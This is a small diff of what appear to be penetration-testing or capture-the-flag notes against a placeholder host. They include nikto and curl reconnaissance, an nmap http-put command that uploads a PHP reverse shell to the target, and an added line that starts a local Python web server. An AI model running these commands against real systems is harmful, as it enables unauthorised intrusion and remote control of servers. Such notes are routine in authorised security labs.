@@ -9,4 +9,6 @@ nikto -h <ip> -o nikto.txt
 curl -v -X OPTIONS http://<ip>
 nmap -p80 <ip> --script http-put --script-args http-put.url='/test/php-reverse-shell.php',http-put.file='php-reverse-shell.php'
 
+python -m SimpleHTTPServer 8000
+
 tesseract blow.jpg output --oem 1 -l eng
